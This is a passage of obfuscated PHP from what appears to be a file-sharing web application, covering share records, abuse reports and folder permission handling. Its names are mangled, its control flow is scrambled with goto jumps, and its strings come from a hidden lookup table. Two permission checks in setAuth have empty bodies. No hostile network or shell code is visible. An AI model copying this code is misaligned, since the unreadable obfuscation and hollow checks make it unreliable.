$fù∂ƒ§·ÛÒ; } goto C»¨∏Õ¿…Û; eäËÁ¯ƒ‡—: $D«ÙùîŸôì =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_array($f†‘€Ö™«Ê)) { return !1; } $CﬂºÜÏÈ™Ñ = Model($D«ÙùîŸôì[2142]); goto EËÚ≤ÙßÂ·; C»¨∏Õ¿…Û: return $CﬂºÜÏÈ™Ñ->addAll($cÂÖêΩï¥, array(), !0); goto dÒ¢¡◊ˆﬁ÷; dÒ¢¡◊ˆﬁ÷: } public function numViewAdd($Bú´ÖıÎùù) { $dÁ–¨≤‡¥é =& $_SERVER[£¿ÌÙëü¡¯¯]; $fç‘ë íÏÏ = array($dÁ–¨≤‡¥é[436] => $Bú´ÖıÎùù); $this->where($fç‘ë íÏÏ)->setAdd($dÁ–¨≤‡¥é[2138]); } public function numDownloadAdd($c“öä ‹√Ö) { $EΩ±«óë…Á =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dæ°»À⁄ÕÖ = array($EΩ±«óë…Á[436] => $c“öä ‹√Ö); $this->where($Dæ°»À⁄ÕÖ)->setAdd($EΩ±«óë…Á[2139]); } protected function shareEdit($EÎ„≠‰˘‰ﬂ, $cöÇ™ìÊèÑ) { goto dÇØïüë”—; AÉœîé”ì¥: $this->_checkLinkShare($cöÇ™ìÊèÑ, $EÔπ´¿ÓÕæ); $AÉ«—õ∆Ô‘ = array(); $FÖí•Ú†çô = explode($fá‡Øêìπ‹[47], $fá‡Øêìπ‹[2145]); goto b¯©≤∞íõ∆; dÇØïüë”—: $fá‡Øêìπ‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÔπ´¿ÓÕæ = $this->getInfo($EÎ„≠‰˘‰ﬂ); if (!$EÔπ´¿ÓÕæ) { return !1; } goto AÉœîé”ì¥; b¯©≤∞íõ∆: foreach ($FÖí•Ú†çô as $aéœÔ«Ö¡) { if (!array_key_exists($aéœÔ«Ö¡, $cöÇ™ìÊèÑ)) { continue; } $AÉ«—õ∆Ô‘[$aéœÔ«Ö¡] = $cöÇ™ìÊèÑ[$aéœÔ«Ö¡]; } $this->shareEventAdd($EÔπ´¿ÓÕæ[$fá‡Øêìπ‹[366]], $cöÇ™ìÊèÑ, $fá‡Øêìπ‹[1982]); $this->where(array($fá‡Øêìπ‹[436] => $EÎ„≠‰˘‰ﬂ))->save($AÉ«—õ∆Ô‘); goto A¡Êà’øÁ‹; A¡Êà’øÁ‹: if (isset($cöÇ™ìÊèÑ[$fá‡Øêìπ‹[2131]])) { $this->_shareAuthSet($EÎ„≠‰˘‰ﬂ, $cöÇ™ìÊèÑ[$fá‡Øêìπ‹[2131]]); } return !0; goto b¨à”ÓÃ‰”; b¨à”ÓÃ‰”: } private function _checkLinkShare($BŒ§‚ßÛÍ†, $bêŸ•ÍàÌ®) { $f∏’°ªÂÓã =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($BŒ§‚ßÛÍ†[$f∏’°ªÂÓã[442]] != $f∏’°ªÂÓã[84] || $bêŸ•ÍàÌ®[$f∏’°ªÂÓã[388]][$f∏’°ªÂÓã[29]] != $f∏’°ªÂÓã[164]) { return; } $bœÔÚ∆∫§Ñ = Model($f∏’°ªÂÓã[749])->fileInfoGet($bêŸ•ÍàÌ®[$f∏’°ªÂÓã[388]][$f∏’°ªÂÓã[366]]); if (!$bœÔÚ∆∫§Ñ) { return; } $eØÁﬁí·Ìƒ = $this->shareFileMeta($bœÔÚ∆∫§Ñ[$f∏’°ªÂÓã[415]]); if (isset($eØÁﬁí·Ìƒ[$f∏’°ªÂÓã[354]]) && $eØÁﬁí·Ìƒ[$f∏’°ªÂÓã[354]] == $f∏’°ªÂÓã[84]) { show_json(LNG($f∏’°ªÂÓã[2146]), !1); } } protected function remove($dü‡çÌÏÆÈ) { goto dò®Ì†£å‚; dò®Ì†£å‚: $bàú´÷˜Ì· =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($dü‡çÌÏÆÈ)) { $dü‡çÌÏÆÈ = array($bàú´÷˜Ì·[7], $dü‡çÌÏÆÈ); } $FïÎµèì„ = array($bàú´÷˜Ì·[437] => $dü‡çÌÏÆÈ); goto D·Ûﬂ™üﬁ; D·Ûﬂ™üﬁ: $C«üÉçƒ‰Ω = $this->where($FïÎµèì„)->delete(); if ($C«üÉçƒ‰Ω) { Model($bàú´÷˜Ì·[529])->where(array($bàú´÷˜Ì·[437] => $dü‡çÌÏÆÈ))->delete(); } $AÑ›„®Á⁄à = is_array($dü‡çÌÏÆÈ) ? $dü‡çÌÏÆÈ[1] : array($dü‡çÌÏÆÈ); goto Fà≠÷ñ˘ÍÕ; Fà≠÷ñ˘ÍÕ: for ($Eãî≤€Æ…ò = 0; $Eãî≤€Æ…ò < count($AÑ›„®Á⁄à); $Eãî≤€Æ…ò++) { $dˆ“ÍÌµ©â = $this->getInfo($AÑ›„®Á⁄à[$Eãî≤€Æ…ò]); if ($dˆ“ÍÌµ©â[$bàú´÷˜Ì·[444]] == $bàú´÷˜Ì·[84]) { Model($bàú´÷˜Ì·[497])->eventShare($dˆ“ÍÌµ©â[$bàú´÷˜Ì·[366]], $bàú´÷˜Ì·[2136]); } if ($dˆ“ÍÌµ©â[$bàú´÷˜Ì·[442]] == $bàú´÷˜Ì·[84]) { Model($bàú´÷˜Ì·[497])->eventShare($dˆ“ÍÌµ©â[$bàú´÷˜Ì·[366]], $bàú´÷˜Ì·[2135]); } } return $C«üÉçƒ‰Ω; goto c®£‚èÛ‚¬; c®£‚èÛ‚¬: } protected function removeBySource($aÑí¿Ÿ¡áñ) { goto f„‹ªº¬ãå; c°‰è€Ùçˆ: $C˜≥ª≥È—é = array_to_keyvalue($C˜≥ª≥È—é, $b…éñ„âî¿[33], $b…éñ„âî¿[437]); if (!$C˜≥ª≥È—é) { return; } $EÑúÎ⁄û⁄ƒ = array($b…éñ„âî¿[436] => array($b…éñ„âî¿[381], $C˜≥ª≥È—é)); goto Dﬁ¶Ê˜óÉ´; Dﬁ¶Ê˜óÉ´: $this->where($EÑúÎ⁄û⁄ƒ)->delete(); Model($b…éñ„âî¿[529])->where($EÑúÎ⁄û⁄ƒ)->delete(); goto FÿßÇœ´Ã‹; f„‹ªº¬ãå: $b…éñ„âî¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÑúÎ⁄û⁄ƒ = array($b…éñ„âî¿[380] => array($b…éñ„âî¿[381], $aÑí¿Ÿ¡áñ)); $C˜≥ª≥È—é = $this->field($b…éñ„âî¿[437])->where($EÑúÎ⁄û⁄ƒ)->select(); goto c°‰è€Ùçˆ; FÿßÇœ´Ã‹: } public function listAll($AÂÁÔï∏∞Æ) { goto AÓªàÃÛﬁ°; A€ÎÃ›†ÉÙ: return $cıÌﬂ˘Æ¥µ; goto FÕÁËπ®é€; AÓªàÃÛﬁ°: $bÜÚ”ËëÉ¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÛòî√†÷Á = array(); if ($AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[1349]]) { $eÛòî√†÷Á[$bÜÚ”ËëÉ¨[1349]] = $AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[1349]]; } goto E’ëË¨ç∆Á; a¢ıóÙ‘Ü˘: $cıÌﬂ˘Æ¥µ = $this->_makeOrder()->where($eÛòî√†÷Á)->selectPage(20); if (empty($cıÌﬂ˘Æ¥µ[$bÜÚ”ËëÉ¨[350]])) { return array(); } $this->_listDataApply($cıÌﬂ˘Æ¥µ[$bÜÚ”ËëÉ¨[350]]); goto A€ÎÃ›†ÉÙ; E’ëË¨ç∆Á: if ($AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[689]]) { $dçÚÑÌ¨≥ÿ = $AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[690]] ? $AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[690]] : strtotime(date($bÜÚ”ËëÉ¨[2147])); $eÛòî√†÷Á[$bÜÚ”ËëÉ¨[184]] = array($bÜÚ”ËëÉ¨[318], array($AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[689]], $dçÚÑÌ¨≥ÿ)); } if ($AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[29]]) { $eÛòî√†÷Á[$AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[29]]] = 1; } else { $eÛòî√†÷Á[] = array($bÜÚ”ËëÉ¨[442] => array($bÜÚ”ËëÉ¨[924], 0), $bÜÚ”ËëÉ¨[444] => array($bÜÚ”ËëÉ¨[924], 0), $bÜÚ”ËëÉ¨[2126] => $bÜÚ”ËëÉ¨[2095]); } if ($AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[2091]]) { $eÛòî√†÷Á[] = array($bÜÚ”ËëÉ¨[439] => $AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[2091]], $bÜÚ”ËëÉ¨[1248] => array($bÜÚ”ËëÉ¨[748], "\x25{$AÂÁÔï∏∞Æ[$bÜÚ”ËëÉ¨[2091]]}\x25"), $bÜÚ”ËëÉ¨[2126] => $bÜÚ”ËëÉ¨[2095]); } goto a¢ıóÙ‘Ü˘; FÕÁËπ®é€: } private function _listDataApply(&$Eë”èËù¬ﬁ) { $EÂ≥Ö¥ÑÑ⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b◊êç˜æ´Õ = array_to_keyvalue($Eë”èËù¬ﬁ, $EÂ≥Ö¥ÑÑ⁄[33], $EÂ≥Ö¥ÑÑ⁄[1349]); $Bıö™Á±Îà = Model($EÂ≥Ö¥ÑÑ⁄[469])->userListInfo(array_unique($b◊êç˜æ´Õ)); $déÑ¶çüÂ— = array_to_keyvalue($Eë”èËù¬ﬁ, $EÂ≥Ö¥ÑÑ⁄[33], $EÂ≥Ö¥ÑÑ⁄[366]); $f‰†¥§ÕëÛ = Model($EÂ≥Ö¥ÑÑ⁄[749])->sourceListInfo($déÑ¶çüÂ—, !0); foreach ($Eë”èËù¬ﬁ as &$a¨ÁÜ€≤ë©) { $e¯¡ÀÌÓ¡œ = $a¨ÁÜ€≤ë©[$EÂ≥Ö¥ÑÑ⁄[1349]]; $a¨ÁÜ€≤ë©[$EÂ≥Ö¥ÑÑ⁄[2148]] = $Bıö™Á±Îà[$e¯¡ÀÌÓ¡œ] ? $Bıö™Á±Îà[$e¯¡ÀÌÓ¡œ] : !1; $A‡êõµãô¢ = $a¨ÁÜ€≤ë©[$EÂ≥Ö¥ÑÑ⁄[366]]; $a¨ÁÜ€≤ë©[$EÂ≥Ö¥ÑÑ⁄[388]] = $f‰†¥§ÕëÛ[$A‡êõµãô¢] ? $f‰†¥§ÕëÛ[$A‡êõµãô¢] : !1; } } private function _makeOrder($AãÑŒ˘–Á£ = '') { goto fâı¬Øüª·; fâı¬Øüª·: $fƒ…˜á¥’ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $D¥õ°ó∫Ô‰ = array($fƒ…˜á¥’ï[184], $fƒ…˜á¥’ï[690], $fƒ…˜á¥’ï[2138], $fƒ…˜á¥’ï[2139]); $BÎªûπ«œ≠ = array($fƒ…˜á¥’ï[398] => $fƒ…˜á¥’ï[399], $fƒ…˜á¥’ï[400] => $fƒ…˜á¥’ï[401]); goto b‰¡Ï÷±ª´; b‰¡Ï÷±ª´: $D≥›ó¨¢üù = Input::get($fƒ…˜á¥’ï[403], $fƒ…˜á¥’ï[7], $fƒ…˜á¥’ï[386], $D¥õ°ó∫Ô‰); $D¢∂ø∂÷∫° = Input::get($fƒ…˜á¥’ï[404], $fƒ…˜á¥’ï[7], $fƒ…˜á¥’ï[2149], array($fƒ…˜á¥’ï[2090], $fƒ…˜á¥’ï[400])); $D¢∂ø∂÷∫° = $BÎªûπ«œ≠[$D¢∂ø∂÷∫°]; goto Eﬂ›î«⁄ìú; Eﬂ›î«⁄ìú: $AãÑŒ˘–Á£ = $AãÑŒ˘–Á£ . "{$D≥›ó¨¢üù}\x20{$D¢∂ø∂÷∫°}"; return $this->order($AãÑŒ˘–Á£); goto eÎ‡áóöıˆ; eÎ‡áóöıˆ: } public function reportAdd($F©Ô¶ÍÑñ‘) { $Aú‡°ÔñÜﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aåªú∑çñ• = array($Aú‡°ÔñÜﬁ[437] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[437]], $Aú‡°ÔñÜﬁ[1349] => USER_ID); if (Model($Aú‡°ÔñÜﬁ[2150])->where($aåªú∑çñ•)->find()) { return !1; } $cÆ•˜ÑÜÃÎ = array($Aú‡°ÔñÜﬁ[437] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[437]], $Aú‡°ÔñÜﬁ[1248] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[1248]], $Aú‡°ÔñÜﬁ[366] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[366]], $Aú‡°ÔñÜﬁ[415] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[415]], $Aú‡°ÔñÜﬁ[1349] => USER_ID, $Aú‡°ÔñÜﬁ[29] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[29]], $Aú‡°ÔñÜﬁ[401] => $F©Ô¶ÍÑñ‘[$Aú‡°ÔñÜﬁ[401]]); return Model($Aú‡°ÔñÜﬁ[2150])->add($cÆ•˜ÑÜÃÎ); } public function reportList($A≠á‡È·æì) { goto BÑ¨”≠ì≠Ö; BÑ¨”≠ì≠Ö: $få’å·øüﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bß‚Úî∆êπ = array(); if ($A≠á‡È·æì[$få’å·øüﬂ[689]]) { $aáÿêòå«≥ = $A≠á‡È·æì[$få’å·øüﬂ[690]] ? $A≠á‡È·æì[$få’å·øüﬂ[690]] : strtotime(date($få’å·øüﬂ[2147])); $bß‚Úî∆êπ[$få’å·øüﬂ[184]] = array($få’å·øüﬂ[318], array($A≠á‡È·æì[$få’å·øüﬂ[689]], $aáÿêòå«≥)); } goto a†∫éèŒ∏¶; CÑö„˘–À: if (empty($b÷±πÓæ””[$få’å·øüﬂ[350]])) { return array(); } $this->_listDataApply($b÷±πÓæ””[$få’å·øüﬂ[350]]); return $b÷±πÓæ””; goto D›…ŸûÿΩà; Eëñö÷µ‡ø: $C≤˜¶Àòº◊ = array($få’å·øüﬂ[398] => $få’å·øüﬂ[399], $få’å·øüﬂ[400] => $få’å·øüﬂ[401]); $EÑÖ‹ÚÍ∞° = $få’å·øüﬂ[2154] . $C≤˜¶Àòº◊[$FËˆºÖ€ÒÖ]; $b÷±πÓæ”” = Model($få’å·øüﬂ[2150])->where($bß‚Úî∆êπ)->order($EÑÖ‹ÚÍ∞°)->selectPage(20); goto CÑö„˘–À; a†∫éèŒ∏¶: if (isset($A≠á‡È·æì[$få’å·øüﬂ[29]]) && in_array($A≠á‡È·æì[$få’å·øüﬂ[29]], array($få’å·øüﬂ[84], $få’å·øüﬂ[2151], $få’å·øüﬂ[2152], $få’å·øüﬂ[2153], $få’å·øüﬂ[1829]))) { $bß‚Úî∆êπ[$få’å·øüﬂ[29]] = $A≠á‡È·æì[$få’å·øüﬂ[29]]; } if (isset($A≠á‡È·æì[$få’å·øüﬂ[676]]) && in_array($A≠á‡È·æì[$få’å·øüﬂ[676]], array($få’å·øüﬂ[464], $få’å·øüﬂ[84], $få’å·øüﬂ[2151], $få’å·øüﬂ[2152]))) { $bß‚Úî∆êπ[$få’å·øüﬂ[676]] = $A≠á‡È·æì[$få’å·øüﬂ[676]]; } $FËˆºÖ€ÒÖ = Input::get($få’å·øüﬂ[404], $få’å·øüﬂ[7], $få’å·øüﬂ[2149], array($få’å·øüﬂ[2090], $få’å·øüﬂ[400])); goto Eëñö÷µ‡ø; D›…ŸûÿΩà: } public function reportStatus($a†ÌãÖäÙΩ) { goto CÎÛ”ôı™ñ; cÒºøÑÛßÜ: $eﬁµêÑﬂÎ© = Model($F°Æ‚ˆ’ºµ[2150])->where($Aè∫˜ê©°â)->save($a”Øä’Ã†≈); if ($a†ÌãÖäÙΩ[$F°Æ‚ˆ’ºµ[676]] == $F°Æ‚ˆ’ºµ[2151]) { if ($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[415]] != $F°Æ‚ˆ’ºµ[464] && $this->shareFileMeta($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[415]])) { $this->shareFileMeta($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[415]], 0); } return $this->remove($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[437]]); } if ($eﬁµêÑﬂÎ© && $a†ÌãÖäÙΩ[$F°Æ‚ˆ’ºµ[676]] == $F°Æ‚ˆ’ºµ[2152]) { $a˘›Ë∆ÓÊë = $a”Øä’Ã†≈[$F°Æ‚ˆ’ºµ[676]] == $F°Æ‚ˆ’ºµ[2152] ? 1 : 0; $this->shareFileMeta($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[415]], $a˘›Ë∆ÓÊë); $this->removeByFile($bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[415]]); } goto F÷ˆÎ‚·Ç¿; fùóà◊ı“ﬁ: if (!$bË±òÇçÉÇ) { return !1; } $a”Øä’Ã†≈ = array($F°Æ‚ˆ’ºµ[676] => $a†ÌãÖäÙΩ[$F°Æ‚ˆ’ºµ[676]]); if ($a†ÌãÖäÙΩ[$F°Æ‚ˆ’ºµ[676]] == $F°Æ‚ˆ’ºµ[2152] && $bË±òÇçÉÇ[$F°Æ‚ˆ’ºµ[676]] == $F°Æ‚ˆ’ºµ[2152]) { $a”Øä’Ã†≈[$F°Æ‚ˆ’ºµ[676]] = 0; } goto cÒºøÑÛßÜ; F÷ˆÎ‚·Ç¿: return $eﬁµêÑﬂÎ©; goto aÑçôö‡Óª; CÎÛ”ôı™ñ: $F°Æ‚ˆ’ºµ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aè∫˜ê©°â = array($F°Æ‚ˆ’ºµ[364] => $a†ÌãÖäÙΩ[$F°Æ‚ˆ’ºµ[364]]); $bË±òÇçÉÇ = Model($F°Æ‚ˆ’ºµ[2150])->where($Aè∫˜ê©°â)->field($F°Æ‚ˆ’ºµ[2155])->find(); goto fùóà◊ı“ﬁ; aÑçôö‡Óª: } private function removeByFile($Fµ†Ω›ï∏á) { goto C›àÌ⁄™ú÷; Aˆàã˘˘êâ: $this->remove($bŒ§Ôÿ¢°◊); goto dÚë£«√ù†; C›àÌ⁄™ú÷: $Dü‹û¿ªÑà =& $_SERVER[£¿ÌÙëü¡¯¯]; $A◊Ù≠óÛÜ = Model($Dü‹û¿ªÑà[749])->where(array($Dü‹û¿ªÑà[415] => $Fµ†Ω›ï∏á))->field($Dü‹û¿ªÑà[366])->select(); $CöÉÒó÷ïå = array_to_keyvalue($A◊Ù≠óÛÜ, $Dü‹û¿ªÑà[33], $Dü‹û¿ªÑà[366]); goto e∫ïéå¥˜ﬂ; e∫ïéå¥˜ﬂ: $Eªªõ˘§–õ = array($Dü‹û¿ªÑà[366] => array($Dü‹û¿ªÑà[7], $CöÉÒó÷ïå), $Dü‹û¿ªÑà[442] => 1); $A◊Ù≠óÛÜ = Model($Dü‹û¿ªÑà[1990])->where($Eªªõ˘§–õ)->field($Dü‹û¿ªÑà[437])->select(); $bŒ§Ôÿ¢°◊ = array_to_keyvalue($A◊Ù≠óÛÜ, $Dü‹û¿ªÑà[33], $Dü‹û¿ªÑà[437]); goto Aˆàã˘˘êâ; dÚë£«√ù†: } private function shareFileMeta($B•ﬁùƒñÚæ, $bÇÔû©’òå = null) { $EﬁÈÈﬂã∏‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bπçß§ÁÉñ = array($EﬁÈÈﬂã∏‹[415] => $B•ﬁùƒñÚæ, $EﬁÈÈﬂã∏‹[90] => $EﬁÈÈﬂã∏‹[2156]); if (is_null($bÇÔû©’òå)) { return Model($EﬁÈÈﬂã∏‹[2157])->where($Bπçß§ÁÉñ)->find(); } $Bπçß§ÁÉñ[$EﬁÈÈﬂã∏‹[354]] = $bÇÔû©’òå; Model($EﬁÈÈﬂã∏‹[2157])->add($Bπçß§ÁÉñ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\x63\x65\x5f\141\165\164\150"; public function getAuth($fßﬂ°ÿˆ∑ﬁ) { goto DÓ§æàçﬂé; dÈ–áùÆ√¨: return $EÙÖ¬ªå˜ﬂ; goto bœéàë‡ö¨; DÓ§æàçﬂé: $bçŸ¢†É∂á =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fª⁄à€Çõ— = $bçŸ¢†É∂á[2158]; $F◊ÒêÙﬂΩÿ = array($bçŸ¢†É∂á[366] => $fßﬂ°ÿˆ∑ﬁ); goto d≈ï÷≈Ωœ; d≈ï÷≈Ωœ: $D©Áñ‘Çû≤ = $this->field($Fª⁄à€Çõ—)->order($bçŸ¢†É∂á[364])->where($F◊ÒêÙﬂΩÿ)->select(); $EÙÖ¬ªå˜ﬂ = array(); foreach ($D©Áñ‘Çû≤ as $f°‡øáä¯â) { if (Model($bçŸ¢†É∂á[2159])->listData($f°‡øáä¯â[$bçŸ¢†É∂á[2143]])) { $EÙÖ¬ªå˜ﬂ[] = $f°‡øáä¯â; } } goto dÈ–áùÆ√¨; bœéàë‡ö¨: } public function setAuth($cøﬂè©å”è, $DÕ¶∫£©úœ) { goto d™®Àæ¬´Ú; D÷™Û¯—ΩÎ: $aµ™–áíŒÑ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E∞⁄ÓŒÖÚ∫ = array(); foreach ($DÕ¶∫£©úœ as $c˘ÏÏ¥É•‹) { if (!in_array($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[368]], $aµ™–áíŒÑ)) { show_json(LNG($e∑Ï∫ÓÇ°õ[2160]), !1); } if ($Dúõàˆ‡Ç != $CŸÑ—Ø∏ó±) { if ($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[368]] == SourceModel::TYPE_GROUP) { } if ($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[452]] != 0 && !in_array($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[452]], $bîµ¬Ç∆‚ß)) { } } if ($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[452]] == 0) { $c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[368]] = SourceModel::TYPE_USER; } $E∞⁄ÓŒÖÚ∫[] = array($e∑Ï∫ÓÇ°õ[366] => $cøﬂè©å”è, $e∑Ï∫ÓÇ°õ[368] => intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[368]]), $e∑Ï∫ÓÇ°õ[452] => intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[452]]), $e∑Ï∫ÓÇ°õ[2143] => intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[2143]]) ? intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[2143]]) : 0, $e∑Ï∫ÓÇ°õ[2144] => intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[2144]]) ? intval($c˘ÏÏ¥É•‹[$e∑Ï∫ÓÇ°õ[2144]]) : -1); } goto DÕ¯Üéüñé; DÕ¯Üéüñé: $this->where(array($e∑Ï∫ÓÇ°õ[380] => $cøﬂè©å”è))->delete(); $this->addAll($E∞⁄ÓŒÖÚ∫); return !0; goto cã’ÊùâŸ; d™®Àæ¬´Ú: $e∑Ï∫ÓÇ°õ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d±€é¢ì‹© = Model($e∑Ï∫ÓÇ°õ[1084])->sourceInfo($cøﬂè©å”è); if ($d±€é¢ì‹©[$e∑Ï∫ÓÇ°õ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto D≈Ã†≠íç”; D≈Ã†≠íç”: $CŸÑ—Ø∏ó± = 1; $Dúõàˆ‡Ç = $d±€é¢ì‹©[$e∑Ï∫ÓÇ°õ[452]]; if ($Dúõàˆ‡Ç != $CŸÑ—Ø∏ó±) { $cÏﬂîäÀº† = array($e∑Ï∫ÓÇ°õ[2013] => $Dúõàˆ‡Ç); $bîµ¬Ç∆‚ß = Model($e∑Ï∫ÓÇ°õ[2089])->field($e∑Ï∫ÓÇ°õ[1349])->where($cÏﬂîäÀº†)->select(); $bîµ¬Ç∆‚ß = array_to_keyvalue($bîµ¬Ç∆‚ß, $e∑Ï∫ÓÇ°õ[33], $e∑Ï∫ÓÇ°õ[1349]); } goto D÷™Û¯—ΩÎ; cã’ÊùâŸ: } public function authClear($Aæ≥„“Ì≤ﬁ) { $aîÀ≥à∫ﬂÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B‚‡∫·≈†í = Model($aîÀ≥à∫ﬂÑ[1084])->sourceInfo($Aæ≥„“Ì≤ﬁ); $F´ÓªÖì≤∆ = array($Aæ≥„“Ì≤ﬁ); if ($B‚‡∫·≈†í[$aîÀ≥à∫ﬂÑ[367]] == $aîÀ≥à∫ﬂÑ[84]) { $Bû‡∆˘ÑîÓ = array($aîÀ≥à∫ﬂÑ[517] => array($aîÀ≥à∫ﬂÑ[475], $B‚‡∫·≈†í[$aîÀ≥à∫ﬂÑ[455]] . $Aæ≥„“Ì≤ﬁ . $aîÀ≥à∫ﬂÑ[476])); $F´ÓªÖì≤∆ = Model($aîÀ≥à∫ﬂÑ[1084])->field($aîÀ≥à∫ﬂÑ[380])->where($Bû‡∆˘ÑîÓ)->getField($aîÀ≥à∫ﬂÑ[366], !0); $F´ÓªÖì≤∆[] = $Aæ≥„“Ì≤ﬁ; } $this->where(array($aîÀ≥à∫ﬂÑ[380] => array($aîÀ≥à∫ﬂÑ[381], $F´ÓªÖì≤∆)))->delete(); return !0; } public function get($bµ¡‚ê¢©Ù) { $cóı†Ï¨ì‹ = $this->getSourceList(array($bµ¡‚ê¢©Ù), !0); return $cóı†Ï¨ì‹[0]; } public function getSourceList($dá–ëñ‚ªô, $Eì¶ƒ±®êó = false) { goto dùà–€‚éª; cÎÉé‚ıß”: $fÖÚ≈´¯ÒŒ = array($BØ‡Îßß‚ù[380] => array($BØ‡Îßß‚ù[381], $a¿‹’¶àÿµ)); $AËô†ñû»´ = $this->field($Fü·ôÕ©Ûñ)->where($fÖÚ≈´¯ÒŒ)->select(); $AËô†ñû»´ = array_to_keyvalue_group($AËô†ñû»´, $BØ‡Îßß‚ù[366]); goto CÁ§ÇÖ¥¶»; CÁ§ÇÖ¥¶»: $d€…“óÓÆÕ = array(); foreach ($Eì¶ƒ±®êó as $AÏ∞πàÆå® => $e≠‹â‚æ∂Â) { $d€…“óÓÆÕ[$AÏ∞πàÆå®] = $this->makeSourceAuth($e≠‹â‚æ∂Â, $AËô†ñû»´); } return $d€…“óÓÆÕ; goto eçÓÆõ‹É≥; EåÑËËﬂ√â: if (!$Eì¶ƒ±®êó) { $fÖÚ≈´¯ÒŒ = array($BØ‡Îßß‚ù[380] => array($BØ‡Îßß‚ù[381], $dá–ëñ‚ªô)); $Eì¶ƒ±®êó = $Fœ–È÷œ◊·->field($BØ‡Îßß‚ù[2161])->where($fÖÚ≈´¯ÒŒ)->select(); $Eì¶ƒ±®êó = array_to_keyvalue($Eì¶ƒ±®êó, $BØ‡Îßß‚ù[366]); } $a¿‹’¶àÿµ = $dá–ëñ‚ªô; foreach ($Eì¶ƒ±®êó as $bÛ∏€óÏ∏â => $déÚÚúä÷‰) { $f”™€´È†À = $Fœ–È÷œ◊·->parentLevelArray($déÚÚúä÷‰[$BØ‡Îßß‚ù[455]]); $a¿‹’¶àÿµ = array_merge($a¿‹’¶àÿµ, $f”™€´È†À, array($bÛ∏€óÏ∏â)); } goto c˜ŸÈÇíØá; c˜ŸÈÇíØá: $a¿‹’¶àÿµ = array_values(array_unique($a¿‹’¶àÿµ)); if (!$a¿‹’¶àÿµ) { return array(); } $Fü·ôÕ©Ûñ = $BØ‡Îßß‚ù[2162]; goto cÎÉé‚ıß”; dùà–€‚éª: $BØ‡Îßß‚ù =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$dá–ëñ‚ªô) { return array(); } $Fœ–È÷œ◊· = Model($BØ‡Îßß‚ù[1084]); goto EåÑËËﬂ√â; eçÓÆõ‹É≥: } public function authDeepCheck($D‰æëè∫ßÔ, $B›Ê‡¡«ßÎ = false) { $dÎÇ∂îªÿç =& $_SERVER[£¿ÌÙëü¡¯¯]; if (_get($GLOBALS, $dÎÇ∂îªÿç[453])) { return !1; } $Dª–ûôê£› = $this->makeAuthDeep(); if (!in_array($D‰æëè∫ßÔ, $Dª–ûôê£›)) { return !1; } return array($dÎÇ∂îªÿç[374] => -1, $dÎÇ∂îªÿç[414] => array($dÎÇ∂îªÿç[382] => $dÎÇ∂îªÿç[1006], $dÎÇ∂îªÿç[2019] => $dÎÇ∂îªÿç[464], $dÎÇ∂îªÿç[383] => LNG($dÎÇ∂îªÿç[2163]), $dÎÇ∂îªÿç[2031] => $dÎÇ∂îªÿç[2164])); } protected function makeAuthDeep() { goto f‹ÛÜÃ—∆á; eÖ–éÍƒ„Ì: $f˜ï∑Üè’å = array_values(array_unique($f˜ï∑Üè’å)); foreach ($f˜ï∑Üè’å as $Fπ§ˆˆîåœ) { $Cê¥∞£Éˆì = $b“ÛÇœ–Ù€->getInfo($Fπ§ˆˆîåœ); $Bö†≥ãë†¨[] = $Cê¥∞£Éˆì[$C´Ò≈ï•›Ω[388]][$C´Ò≈ï•›Ω[366]]; } $Bö†≥ãë†¨ = 